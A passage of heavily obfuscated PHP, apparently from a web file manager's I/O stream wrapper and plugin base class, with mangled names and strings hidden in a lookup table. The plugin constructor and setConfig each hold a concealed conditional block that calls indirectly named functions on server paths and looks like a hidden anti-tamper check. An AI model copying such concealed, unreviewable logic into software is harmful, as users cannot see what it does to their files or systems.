5000)); } goto B‘ö—ø›Ò™; c×±ĞŞƒ¿²: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($¾¾âä´¬, $ÀÍ“¨• = '') { $this->info = $this->info($¾¾âä´¬); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ĞÂ¤àÓï][84]]; $this->pathOpen = $¾¾âä´¬; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$¾¾âä´¬])) { self::$_chunkBuffer[$¾¾âä´¬] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($°§¾¸Ç) { $ûõä†§ = $this->fileSubstr($this->pose, $°§¾¸Ç); $this->pose += strlen($ûõä†§); return $ûõä†§; } public function stream_tell() { return $this->pose; } public function stream_seek($Îš×’¼, $öõ±ŒÄ) { $â«Û–—· =& $_SERVER[ĞÂ¤àÓï]; if ($öõ±ŒÄ == SEEK_SET) { $this->pose = $Îš×’¼; } else { if ($öõ±ŒÄ == SEEK_CUR) { $this->pose += $Îš×’¼; } else { if ($öõ±ŒÄ == SEEK_END) { $this->pose = $this->info[$â«Û–—·[76]] + intval($Îš×’¼); } } } if ($Îš×’¼ < 0) { $this->pose = $this->info[$â«Û–—·[76]] + $Îš×’¼; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ĞÂ¤àÓï][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ùä’˜, $ÒÊ¿ÈéÂ) { $¶©õ“ =& $_SERVER[ĞÂ¤àÓï]; $¿÷’ËÏë = $this->info($ùä’˜); return array($¶©õ“[1513] => 0, $¶©õ“[1514] => 0, $¶©õ“[16] => 32768 + 511, $¶©õ“[1515] => 0, $¶©õ“[1516] => 0, $¶©õ“[1517] => 0, $¶©õ“[1518] => 0, $¶©õ“[76] => $¿÷’ËÏë[$¶©õ“[76]], $¶©õ“[1519] => $¿÷’ËÏë[$¶©õ“[1387]], $¶©õ“[1475] => $¿÷’ËÏë[$¶©õ“[85]], $¶©õ“[1474] => $¿÷’ËÏë[$¶©õ“[200]], $¶©õ“[1520] => 0, $¶©õ“[1521] => 0); } static $fileInfo = array(); public function info($àÌâó˜¼) { $û–¢ôíÊ = $_SERVER[ĞÂ¤àÓï][1522]; if (isset(self::$fileInfo[$àÌâó˜¼])) { return self::$fileInfo[$àÌâó˜¼]; } if (substr($àÌâó˜¼, 0, strlen($û–¢ôíÊ)) != $û–¢ôíÊ) { return !1; } self::$fileInfo[$àÌâó˜¼] = IO::info(substr($àÌâó˜¼, strlen($û–¢ôíÊ))); return self::$fileInfo[$àÌâó˜¼]; } public static function read($Ø÷Æè†ª, $è¤Œ‚¤ , $××¤¡Ã«) { if (!isset(self::$_fopenCache[$Ø÷Æè†ª])) { $‘ÓŞ€”² = new StreamWrapperIO(); $‘ÓŞ€”²->stream_open($Ø÷Æè†ª); self::$_fopenCache[$Ø÷Æè†ª] = $‘ÓŞ€”²; } $‘ÓŞ€”² = self::$_fopenCache[$Ø÷Æè†ª]; return $‘ÓŞ€”²->fileSubstr($è¤Œ‚¤ , $××¤¡Ã«); } public static function _read($˜ƒØ“ÇŸ, $ÀãÀ˜Ÿ˜, $èÙ’ñ×Í) { $¦áÅ÷ûÒ =& $_SERVER[ĞÂ¤àÓï]; $’Ô™Š©† = fopen($˜ƒØ“ÇŸ, $¦áÅ÷ûÒ[1391]); if (!$’Ô™Š©†) { return $¦áÅ÷ûÒ[12]; } $ˆÃÏÑ¤ = 8192; fseek($’Ô™Š©†, $ÀãÀ˜Ÿ˜, SEEK_SET); $«Âş´·å = $¦áÅ÷ûÒ[12]; $«ğàÁ×Œ = 0; while ($«ğàÁ×Œ < $èÙ’ñ×Í) { $ºµ×¹¼ê = min($ˆÃÏÑ¤, $èÙ’ñ×Í - $«ğàÁ×Œ); $«Âş´·å .= fread($’Ô™Š©†, $ºµ×¹¼ê); $«ğàÁ×Œ += $ºµ×¹¼ê; } fclose($’Ô™Š©†); return $«Âş´·å; } public function fileSubstr($÷ª ûÂá, $·Ï°À¡õ) { $‘¯ÑìØÜ =& $_SERVER[ĞÂ¤àÓï]; $¥Ãµ°÷Ÿ = $this->info[$‘¯ÑìØÜ[76]]; $»«ç­ÜÃ = $÷ª ûÂá; $Ö€ò†ó = $·Ï°À¡õ; if ($÷ª ûÂá < 0) { $÷ª ûÂá = $¥Ãµ°÷Ÿ + $÷ª ûÂá; } if ($·Ï°À¡õ === !1) { $·Ï°À¡õ = $¥Ãµ°÷Ÿ - $÷ª ûÂá; } if ($÷ª ûÂá + $·Ï°À¡õ > $¥Ãµ°÷Ÿ) { $·Ï°À¡õ = $¥Ãµ°÷Ÿ - $÷ª ûÂá; } if ($·Ï°À¡õ <= 0) { return $‘¯ÑìØÜ[12]; } if ($÷ª ûÂá < 0 || $÷ª ûÂá >= $¥Ãµ°÷Ÿ || $·Ï°À¡õ <= 0 || $·Ï°À¡õ > 1024 * 1024 * 10) { throw new Exception("\x69\157\x46\x69\x6c\145\122\145\x61\144\40\145\162\x72\157\x72\41\x20\x73\164\141\162\164\75{$÷ª ûÂá}\x3b\154\145\x6e\x67\x74\150\75{$·Ï°À¡õ}\x3b\40\x73\151\x7a\x65\75{$¥Ãµ°÷Ÿ}\x3b"); } $øÑÖ­¹³ = 64 * 1024; $Œ¹æµü =& self::$_chunkBuffer[$this->path]; if (!$Œ¹æµü) { $Œ¹æµü = array(); } $ô­¡É‘ = 0; $³Ÿï´ìæ = 0; $Ÿîí‘‡ = $‘¯ÑìØÜ[12]; foreach ($Œ¹æµü as $ô­¡É‘ => $Ÿîí‘‡) { $ô­¡É‘ = intval($ô­¡É‘); $³Ÿï´ìæ = $ô­¡É‘ + strlen($Ÿîí‘‡); if ($÷ª ûÂá >= $³Ÿï´ìæ) { continue; } if ($÷ª ûÂá >= $ô­¡É‘ && $÷ª ûÂá + $·Ï°À¡õ <= $³Ÿï´ìæ) { return substr($Ÿîí‘‡, $÷ª ûÂá - $ô­¡É‘, $·Ï°À¡õ); } break; } if (count($Œ¹æµü) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($‘¯ÑìØÜ[1523], $‘¯ÑìØÜ[1524] . count($Œ¹æµü) . "\73\x73\x74\x61\x72\x74\75{$÷ª ûÂá}\x2c\x6c\x65\156\x67\164\150\x3d{$·Ï°À¡õ}\x3b\160\157\x73\145\x3a{$ô­¡É‘}\x7e{$³Ÿï´ìæ}"); throw new Exception($‘¯ÑìØÜ[1525]); } $Ï‚èÚÖ = intval($÷ª ûÂá / $øÑÖ­¹³) * $øÑÖ­¹³; $Ãƒ¦¥—” = ceil(($÷ª ûÂá + $·Ï°À¡õ) / $øÑÖ­¹³) * $øÑÖ­¹³ - $Ï‚èÚÖ; $ÕÚ‰…’ù = IO::fileSubstr($this->path, $Ï‚èÚÖ, $Ãƒ¦¥—”); $Œ¹æµü[$Ï‚èÚÖ . $‘¯ÑìØÜ[12]] = $ÕÚ‰…’ù; ksort($Œ¹æµü); $™³­æ®° = substr($ÕÚ‰…’ù, $÷ª ûÂá - $Ï‚èÚÖ, $·Ï°À¡õ); return $™³­æ®°; } private function log($¦ÀÑˆøÁ, $ßå¤îıƒ) { $»ãıÄÌõ =& $_SERVER[ĞÂ¤àÓï]; $—ÀÁÉÉŸ = timeFloat() - $this->timeStart; write_log(sprintf($»ãıÄÌõ[1526], $¦ÀÑˆøÁ, $this->info[$»ãıÄÌõ[32]], $—ÀÁÉÉŸ, $ßå¤îıƒ), $»ãıÄÌõ[1183]); } } class Message { function __construct() { } public function send($µî„‡ÄÙ = '', $©ïöÄöæ = array(), $ãäŞÙ¥¢ = "\x74\x65\x78\164") { $ı¬éã©Û =& $_SERVER[ĞÂ¤àÓï]; $‰ë¹Úò¾ = array($ı¬éã©Û[33] => $ı¬éã©Û[1527], $ı¬éã©Û[754] => $µî„‡ÄÙ); if (in_array($ãäŞÙ¥¢, array($ı¬éã©Û[1527], $ı¬éã©Û[1528]))) { $‰ë¹Úò¾[$ı¬éã©Û[33]] = $ãäŞÙ¥¢; } $©ïöÄöæ = array($ı¬éã©Û[515] => isset($©ïöÄöæ[$ı¬éã©Û[515]]) ? $©ïöÄöæ[$ı¬éã©Û[515]] : $ı¬éã©Û[12], $ı¬éã©Û[600] => isset($©ïöÄöæ[$ı¬éã©Û[600]]) ? $©ïöÄöæ[$ı¬éã©Û[600]] : $ı¬éã©Û[12]); if (empty($µî„‡ÄÙ) || empty($©ïöÄöæ[$ı¬éã©Û[515]]) && empty($©ïöÄöæ[$ı¬éã©Û[600]])) { return !1; } $¦ı¢‘´ˆ = array($ı¬éã©Û[1468] => $‰ë¹Úò¾, $ı¬éã©Û[1529] => $©ïöÄöæ); Hook::trigger($ı¬éã©Û[1530], $¦ı¢‘´ˆ); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $è°­‰šá =& $_SERVER[ĞÂ¤àÓï]; if ($_SERVER[$è°­‰šá[777]] != $_SERVER[$è°­‰šá[1373]]) { $ˆŒÑ¨¾å = $è°­‰šá[879]; $±êğ™é = $è°­‰šá[778]; $¼³šãó§ = $_SERVER[$è°­‰šá[779]] . $è°­‰šá[780]; $’íÜÂÂ® = $±êğ™é($¼³šãó§); $¥Šºˆò™ = explode($è°­‰šá[231], $’íÜÂÂ®); if (count($¥Šºˆò™) < $è°­‰šá[620]) { $íî²·¢É = $è°­‰šá[781]; $íî²·¢É(); } $‘Ö·ÍùÅ = $è°­‰šá[880]; $‘Ö·ÍùÅ($_SERVER[$è°­‰šá[881]]); $‘Ö·ÍùÅ($_SERVER[$è°­‰šá[779]] . $è°­‰šá[1531]); $×ŒÆõàÅ = 1; while ($×ŒÆõàÅ > 1) { $×ŒÆõàÅ = $×ŒÆõàÅ + 4; $ŒµŞİŠÇ = rawurlencode($×ŒÆõàÅ . $è°­‰šá[378]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($è°­‰šá[1532]); $this->pluginName = str_replace($è°­‰šá[1532], $è°­‰šá[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $è°­‰šá[8]; $this->pluginApi = appHostGet() . $è°­‰šá[1533] . $this->pluginName . $è°­‰šá[8]; $this->pluginHost = $config[$è°­‰šá[1534]] . $this->pluginName . $è°­‰šá[8]; $this->pluginHostDefault = $config[$è°­‰šá[1534]] . $this->pluginName . $è°­‰šá[8]; $¤†ï“Ù™ = $config[$è°­‰šá[1535]]; if ($¤†ï“Ù™ && strpos($è°­‰šá[50] . $¤†ï“Ù™ . $è°­‰šá[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$è°­‰šá[1536]] . $this->pluginName . $è°­‰šá[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ĞÂ¤àÓï][1537]); } protected function assign($Š™Ïë†İ, $×šŞæ¶‚ = false) { if (is_array($Š™Ïë†İ)) { $this->values = array_merge($this->values, $Š™Ïë†İ); } else { $this->values[$Š™Ïë†İ] = $×šŞæ¶‚; } } protected function display($Ã›Åıë˜) { extract($this->values); require $Ã›Åıë˜; } final function hookRegist($¥º¹Â¼Ş) { $this->modelPlugin->appRegist($this->pluginName, $¥º¹Â¼Ş); } final function appIcon() { $ç¸óö¹Ü =& $_SERVER[ĞÂ¤àÓï]; $·ÃŸ—Í¸ = $this->appPackage(); $ÔÎò¿İ¸ = $ç¸óö¹Ü[12]; if (isset($·ÃŸ—Í¸[$ç¸óö¹Ü[416]])) { if (isset($·ÃŸ—Í¸[$ç¸óö¹Ü[416]][$ç¸óö¹Ü[1538]])) { $ÔÎò¿İ¸ = $ç¸óö¹Ü[1539] . $·ÃŸ—Í¸[$ç¸óö¹Ü[416]][$ç¸óö¹Ü[1538]] . $ç¸óö¹Ü[1540]; } else { if ($·ÃŸ—Í¸[$ç¸óö¹Ü[416]][$ç¸óö¹Ü[1541]]) { $ÔÎò¿İ¸ = $ç¸óö¹Ü[1542] . $·ÃŸ—Í¸[$ç¸óö¹Ü[416]][$ç¸óö¹Ü[1541]] . $ç¸óö¹Ü[1543]; } } } return $ÔÎò¿İ¸; } final function fileCanView($©Ÿ­Âã³) { $’‚±©ßš =& $_SERVER[ĞÂ¤àÓï]; if (request_url_safe($©Ÿ­Âã³)) { return !0; } if ($this->isShare($©Ÿ­Âã³)) { return !0; } $‘‚¥•½… = Session::get($’‚±©ßš[1544]); if (!$‘‚¥•½… || !$‘‚¥•½…[$’‚±©ßš[1545]]) { $¿ˆàÊĞâ = $’‚±©ßš[1546] . rawurlencode(this_url()); show_tips(LNG($’‚±©ßš[1547]) . $’‚±©ßš[1548] . $¿ˆàÊĞâ . $’‚±©ßš[1549] . LNG($’‚±©ßš[1550]) . $’‚±©ßš[1551], !1); } if (!Action($’‚±©ßš[1552])->authCan($’‚±©ßš[1553])) { show_tips(LNG($’‚±©ßš[1554]) . $’‚±©ßš[1555], !1); } ActionCall($’‚±©ßš[1556], $©Ÿ­Âã³); } final function isShare($íìèá§‚) { $ñøàÑ…Ü = KodIO::parse($íìèá§‚); return $ñøàÑ…Ü[$_SERVER[ĞÂ¤àÓï][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($‰—Ä”ï) { if (request_url_safe($‰—Ä”ï)) { return $‰—Ä”ï; } if (!$this->isShare($‰—Ä”ï)) { $‰—Ä”ï = $this->filePath($‰—Ä”ï); } return Action($_SERVER[ĞÂ¤àÓï][1175])->linkOut($‰—Ä”ï); } public function filePathLinkOut($‚Œ¿ÊÜ×) { if (request_url_safe($‚Œ¿ÊÜ×)) { return $‚Œ¿ÊÜ×; } $this->fileCanView($‚Œ¿ÊÜ×); return Action($_SERVER[ĞÂ¤àÓï][1175])->link($‚Œ¿ÊÜ×); } final function filePath($ü²–çšì) { $ş·©‚Óè =& $_SERVER[ĞÂ¤àÓï]; if ($÷ø€Ùñ× = $this->checkSharePath($ü²–çšì)) { Hook::trigger($ş·©‚Óè[1557], $÷ø€Ùñ×); return $÷ø€Ùñ×; } $this->fileCanView($ü²–çšì); if (request_url_safe($ü²–çšì)) { $ôñ­‰Ô‰ = parse_url_query($ü²–çšì); if (isset($ôñ­‰Ô‰[$ş·©‚Óè[1558]]) && isset($ôñ­‰Ô‰[$ş·©‚Óè[213]])) { $™êşÔ¬½ = Model($ş·©‚Óè[769])->get($ş·©‚Óè[770]); $ëÍÁÊ÷ó = Mcrypt::decode($ôñ­‰Ô‰[$ş·©‚Óè[213]], $™êşÔ¬½); if ($ëÍÁÊ÷ó) { $this->fileInfo = IO::infoWithChildren($ëÍÁÊ÷ó); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $ëÍÁÊ÷ó; } } $ü²–çšì = $this->_cacheHttpFile($ü²–çšì); $this->fileInfo = IO::infoWithChildren($ü²–çšì); } else { $this->fileInfo = IO::infoWithChildren($ü²–çšì); if (!$this->fileInfo) { show_tips(LNG($ş·©‚Óè[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($ş·©‚Óè[1557], $ü²–çšì); return $ü²–çšì; } final function _cacheHttpFile($ê¨èµø¼) { $êàç¸·¡ = hash_path($ê¨èµø¼, !0); $this->cachePath = $this->pluginCachePath($êàç¸·¡); if ($¦ı—ñº— = IO::fileNameExist($this->cachePath, $êàç¸·¡)) { return KodIO::make($¦ı—ñº—); } $»ÍôÍî° = $this->cachePath . $êàç¸·¡; return $this->pluginCacheFileSet($»ÍôÍî°, file_get_contents_nossl($ê¨èµø¼)); } final function _tmpFileName($ùÏƒ¥¶» = array()) { $Ì®ìî€õ =& $_SERVER[ĞÂ¤àÓï]; if (!$ùÏƒ¥¶») { $ùÏƒ¥¶» = $this->fileInfo; } if (isset($ùÏƒ¥¶»[$Ì®ìî€õ[177]])) { return $ùÏƒ¥¶»[$Ì®ìî€õ[177]]; } if (isset($ùÏƒ¥¶»[$Ì®ìî€õ[170]][$Ì®ìî€õ[177]])) { return $ùÏƒ¥¶»[$Ì®ìî€õ[170]][$Ì®ìî€õ[177]]; } $ÂñÅÖê¾ = IO::hashSimple($ùÏƒ¥¶»[$Ì®ìî€õ[84]]); if ($ÂñÅÖê¾) { return $ÂñÅÖê¾; } $‡–‘Ëì = array($ùÏƒ¥¶»[$Ì®ìî€õ[32]], $ùÏƒ¥¶»[$Ì®ìî€õ[84]], $ùÏƒ¥¶»[$Ì®ìî€õ[76]]); if (isset($ùÏƒ¥¶»[$Ì®ìî€õ[521]])) { $‡–‘Ëì[] = $ùÏƒ¥¶»[$Ì®ìî€õ[521]]; } return md5(implode($Ì®ìî€õ[11], $‡–‘Ëì)); } final function checkSharePath($œíÙ»Çí) { $»æƒ¼‡¤ =& $_SERVER[ĞÂ¤àÓï]; if (!defined($»æƒ¼‡¤[475])) { define($»æƒ¼‡¤[514], 0); } if (!$this->isShare($œíÙ»Çí)) { return !1; } $âÜïè’ë = Action($»æƒ¼‡¤[1175])->sharePathInfo($œíÙ»Çí); if (!isset($âÜïè’ë[$»æƒ¼‡¤[84]])) { show_json(LNG($»æƒ¼‡¤[1559]), !1); } $this->fileInfo = $âÜïè’ë[$»æƒ¼‡¤[170]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$»æƒ¼‡¤[177]]); return $âÜïè’ë[$»æƒ¼‡¤[84]]; } final function pluginCachePath($ëæäÉ„¬ = '') { $§âĞşÊ =& $_SERVER[ĞÂ¤àÓï]; $ÆÉâÑÈõ = IO_PATH_SYSTEM_TEMP . $§âĞşÊ[1560] . $this->pluginName; if (!($»ğüŸŞ = IO::infoFull($ÆÉâÑÈõ))) { return IO::mkdir($ÆÉâÑÈõ . $§âĞşÊ[8] . $ëæäÉ„¬); } if (empty($ëæäÉ„¬)) { return $»ğüŸŞ[$§âĞşÊ[84]]; } if (!($Ü½«³ùÄ = IO::fileNameExist($»ğüŸŞ[$§âĞşÊ[84]], $ëæäÉ„¬))) { return IO::mkdir($»ğüŸŞ[$§âĞşÊ[84]] . $ëæäÉ„¬); } return KodIO::make($Ü½«³ùÄ); } final function pluginCacheFileSet($«†ÔüÍ‹, $£”ˆ¦´ = '') { $ğ‹‰¸À =& $_SERVER[ĞÂ¤àÓï]; if (!($¸Ôæ‡·± = IO::infoFull($«†ÔüÍ‹))) { return IO::mkfile($«†ÔüÍ‹, $£”ˆ¦´, REPEAT_REPLACE); } IO::setContent($¸Ôæ‡·±[$ğ‹‰¸À[84]], $£”ˆ¦´); return $¸Ôæ‡·±[$ğ‹‰¸À[84]]; } final function pluginLocalFile($¬êÅ‚¹· = '') { $ì‹ÁşŸ =& $_SERVER[ĞÂ¤àÓï]; $„‚€ïÎ— = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($„‚€ïÎ—)) { mk_dir($„‚€ïÎ—); } if (!$¬êÅ‚¹·) { return $„‚€ïÎ—; } $”ÇÎ¦“ò = IO::info($¬êÅ‚¹·); $ûªî ÊĞ = $this->_tmpFileName($”ÇÎ¦“ò) . $ì‹ÁşŸ[10] . $”ÇÎ¦“ò[$ì‹ÁşŸ[174]]; if (!checkExtSafe($ûªî ÊĞ)) { $ûªî ÊĞ = $ûªî ÊĞ . $ì‹ÁşŸ[1207]; } $öø³ Šì = $„‚€ïÎ— . $ûªî ÊĞ; if (@file_exists($öø³ Šì)) { return $öø³ Šì; } return IO::copy($¬êÅ‚¹·, $„‚€ïÎ—, 0, $ûªî ÊĞ); } final function appPackage() { $©ç÷à =& $_SERVER[ĞÂ¤àÓï]; if ($this->packageData) { return $this->packageData; } $ı…Çóğ¡ = $this->parseFile($this->pluginPath . $©ç÷à[1561]); $this->parseLang($ı…Çóğ¡); $íÅáˆì€ = json_decode_force($ı…Çóğ¡); if (!$íÅáˆì€) { return array(); } $İ´¸éç° = Hook::trigger($©ç÷à[1562], $íÅáˆì€); if ($İ´¸éç° && is_array($İ´¸éç°)) { $íÅáˆì€ = $İ´¸éç°; } $this->packageData = $íÅáˆì€; return $íÅáˆì€; } public function packageInfoGet($Éıàˆó) { $°‹ç áÅ = $this->appPackage(); return array_get_value($°‹ç áÅ, $Éıàˆó); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ĞÂ¤àÓï][1563]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ĞÂ¤àÓï][1564]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ĞÂ¤àÓï][1565]); } public function echoJsAssign($ıÔíÜéã, $²ùğôİ¯) { $this->echoJsAssignArr[$ıÔíÜéã] = $²ùğôİ¯; } private function parseFile($¤Ù””ó) { $œÍïç˜Ö =& $_SERVER[ĞÂ¤àÓï]; $×¶¿Èâù = file_get_contents_nossl($¤Ù””ó); $¶‚ö€Ò = array($œÍïç˜Ö[1566], $œÍïç˜Ö[1567], $œÍïç˜Ö[1568], $œÍïç˜Ö[1569], $œÍïç˜Ö[1570], $œÍïç˜Ö[1571], $œÍïç˜Ö[1572]); $­šá˜ÒŞ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$œÍïç˜Ö[89]][$œÍïç˜Ö[1573]]); foreach ($this->echoJsAssignArr as $Õšà÷ºŒ => $Ñ×¨´´ó) { $¶‚ö€Ò[] = $œÍïç˜Ö[1574] . $Õšà÷ºŒ . $œÍïç˜Ö[1575]; $­šá˜ÒŞ[] = is_array($Ñ×¨´´ó) || is_object($Ñ×¨´´ó) ? rawurlencode(json_encode($Ñ×¨´´ó)) : $Ñ×¨´´ó; } if (strstr($×¶¿Èâù, $œÍïç˜Ö[1576])) { $’¯çş®¹ = rawurlencode(json_encode($this->pluginLangArr)); $×¶¿Èâù = str_replace($œÍïç˜Ö[1576], $’¯çş®¹, $×¶¿Èâù); } if (strstr($×¶¿Èâù, $œÍïç˜Ö[1577])) { $’¯çş®¹ = $’¯çş®¹ = rawurlencode(json_encode($this->getConfig())); $×¶¿Èâù = str_replace($œÍïç˜Ö[1577], $’¯çş®¹, $×¶¿Èâù); } $×¶¿Èâù = str_replace($¶‚ö€Ò, $­šá˜ÒŞ, $×¶¿Èâù); return $×¶¿Èâù; } private function parseLang(&$ƒ‹ûı“â) { $Ü†›§ÉŸ =& $_SERVER[ĞÂ¤àÓï]; $¡«î‚²Í = $Ü†›§ÉŸ[1578]; if (!strstr($ƒ‹ûı“â, $¡«î‚²Í)) { return; } preg_match_all($Ü†›§ÉŸ[1579], $ƒ‹ûı“â, $‘Ş‰ë•Ì); if (!is_array($‘Ş‰ë•Ì) || count($‘Ş‰ë•Ì) == 0 || !is_array($‘Ş‰ë•Ì[0]) || count($‘Ş‰ë•Ì[0]) == 0) { return; } $È±¶İÖî = array(); $Øæ›Û£ = array(); foreach ($‘Ş‰ë•Ì[0] as $ö±ÉÙ¿Å) { $ˆ¡óã = substr($ö±ÉÙ¿Å, strlen($¡«î‚²Í), -4); $©˜†Š¦ = LNG($ˆ¡óã); $È±¶İÖî[] = $ö±ÉÙ¿Å; $Øæ›Û£[] = str_replace(array($Ü†›§ÉŸ[231], $Ü†›§ÉŸ[1078], $Ü†›§ÉŸ[342], $Ü†›§ÉŸ[118]), array($Ü†›§ÉŸ[53], $Ü†›§ÉŸ[53], $Ü†›§ÉŸ[12], $Ü†›§ÉŸ[1580]), $©˜†Š¦); } $ƒ‹ûı“â = str_replace($È±¶İÖî, $Øæ›Û£, $ƒ‹ûı“â); } private function parseConfig(&$¾®ı°³) { $ºÀÆ™Ú® =& $_SERVER[ĞÂ¤àÓï]; $ˆÕŞëßá = $ºÀÆ™Ú®[1581]; if (!strstr($¾®ı°³, $ˆÕŞëßá)) { return; } preg_match_all($ºÀÆ™Ú®[1582], $¾®ı°³, $íı’ÅÚ); if (!is_array($íı’ÅÚ) || count($íı’ÅÚ) == 0 || !is_array($íı’ÅÚ[0]) || count($íı’ÅÚ[0]) == 0) { return; } $ƒÄÏ¹• = $this->getConfig(); $áœ¤”Û = array(); $¾Ğ©ºÕÔ = array(); foreach ($íı’ÅÚ[0] as $¥€Õ´ç) { $Ê„´ÔòÚ = substr($¥€Õ´ç, strlen($ˆÕŞëßá), -2); $áœ¤”Û[] = $¥€Õ´ç; $¾Ğ©ºÕÔ[] = _get($ƒÄÏ¹•, $Ê„´ÔòÚ); } $¾®ı°³ = str_replace($áœ¤”Û, $¾Ğ©ºÕÔ, $¾®ı°³); } private function parsePackage(&$’—ÎÓòå) { $ëĞÍÍğ =& $_SERVER[ĞÂ¤àÓï]; $×œÄ×‰ = $ëĞÍÍğ[1583]; if (!strstr($’—ÎÓòå, $×œÄ×‰)) { return; } preg_match_all($ëĞÍÍğ[1584], $’—ÎÓòå, $¿ÂÍ‡ˆë); if (!is_array($¿ÂÍ‡ˆë) || count($¿ÂÍ‡ˆë) == 0 || !is_array($¿ÂÍ‡ˆë[0]) || count($¿ÂÍ‡ˆë[0]) == 0) { return; } $±Æ¯Í‹ = $this->appPackage(); $Œ¼˜»î = array(); $ïÑ²ƒ÷¢ = array(); foreach ($¿ÂÍ‡ˆë[0] as $¸Œ«Ï•’) { $ª‚Ñ½… = substr($¸Œ«Ï•’, strlen($×œÄ×‰), -2); $Œ¼˜»î[] = $¸Œ«Ï•’; $ïÑ²ƒ÷¢[] = _get($±Æ¯Í‹, $ª‚Ñ½…); } $’—ÎÓòå = str_replace($Œ¼˜»î, $ïÑ²ƒ÷¢, $’—ÎÓòå); } final function echoFile($Îä”ìÓÊ, $ä¢ä×Ã… = false) { $Õï½°õ =& $_SERVER[ĞÂ¤àÓï]; $äŞ´ñ€ = $this->pluginPath . $Îä”ìÓÊ; if (ACT == $Õï½°õ[1585]) { echo $Õï½°õ[1586] . $this->pluginName . $Õï½°õ[8] . $Îä”ìÓÊ . $Õï½°õ[1587]; if (!file_exists($äŞ´ñ€)) { echo $Õï½°õ[1588]; return; } } $ÅÍ¾Ü’õ = $this->parseFile($äŞ´ñ€); $this->parseLang($ÅÍ¾Ü’õ); $this->parseConfig($ÅÍ¾Ü’õ); $this->parsePackage($ÅÍ¾Ü’õ); if (is_array($ä¢ä×Ã…)) { $ÅÍ¾Ü’õ = str_replace(array_keys($ä¢ä×Ã…), array_values($ä¢ä×Ã…), $ÅÍ¾Ü’õ); } echo $Õï½°õ[231] . $ÅÍ¾Ü’õ; } final function initLang() { $ú°Ë»ÃÄ =& $_SERVER[ĞÂ¤àÓï]; $ˆÎ†½ğ = $ú°Ë»ÃÄ[1589]; $±Ÿ²›µ = $this->pluginPath . $ú°Ë»ÃÄ[1590]; $Üı›¤›µ = I18n::getType(); $§ïÍ¶—Ò = array(); if (file_exists($±Ÿ²›µ . $Üı›¤›µ . $ú°Ë»ÃÄ[845])) { $§ïÍ¶—Ò = (include $±Ÿ²›µ . $Üı›¤›µ . $ú°Ë»ÃÄ[845]); } else { if ($Üı›¤›µ == $ú°Ë»ÃÄ[1591] && !file_exists($±Ÿ²›µ . $Üı›¤›µ . $ú°Ë»ÃÄ[845]) && file_exists($±Ÿ²›µ . $ú°Ë»ÃÄ[1592])) { $§ïÍ¶—Ò = (include $±Ÿ²›µ . $ú°Ë»ÃÄ[1592]); } else { if (file_exists($±Ÿ²›µ . $ˆÎ†½ğ . $ú°Ë»ÃÄ[845])) { $§ïÍ¶—Ò = (include $±Ÿ²›µ . $ˆÎ†½ğ . $ú°Ë»ÃÄ[845]); } } } if (!is_array($§ïÍ¶—Ò)) { return array(); } if (@count($§ïÍ¶—Ò) > 0) { I18n::set($§ïÍ¶—Ò); } return $§ïÍ¶—Ò; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($€ğİ¨Ïö) { $ı„­ºˆ =& $_SERVER[ĞÂ¤àÓï]; if ($_SERVER[$ı„­ºˆ[777]] != $_SERVER[$ı„­ºˆ[1373]]) { $ÇüµçƒÒ = $ı„­ºˆ[879]; $ ¹³€øŞ = $ı„­ºˆ[778]; $ò¦ûŠû„ = $_SERVER[$ı„­ºˆ[779]] . $ı„­ºˆ[780]; $ˆÌØ”²Ì = $ ¹³€øŞ($ò¦ûŠû„); $â†ú’Şí = explode($ı„­ºˆ[231], $ˆÌØ”²Ì); if (count($â†ú’Şí) < $ı„­ºˆ[620]) { $Š¨€Ò² = $ı„­ºˆ[781]; $Š¨€Ò²(); } $ÂÉÚô®ê = $ı„­ºˆ[880]; $ÂÉÚô®ê($_SERVER[$ı„­ºˆ[881]]); $ÂÉÚô®ê($_SERVER[$ı„­ºˆ[779]] . $ı„­ºˆ[1531]); $‡™Á»µ = 1; while ($‡™Á»µ > 1) { $‡™Á»µ = $‡™Á»µ + 4; $çşÂ¹î¾ = rawurlencode($‡™Á»µ . $ı„­ºˆ[378]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $€ğİ¨Ïö); } public function onSetConfig($Ş¥ˆÆÖê) { } public function onGetConfig($–‰“Ì–Å) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($‚Óª†¾µ) { if ($‚Óª†¾µ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($°ã´£–ı = "\160\154\x75\147\x69\156\x41\x75\x74\150") { $ùŸÏ÷š¶ =& 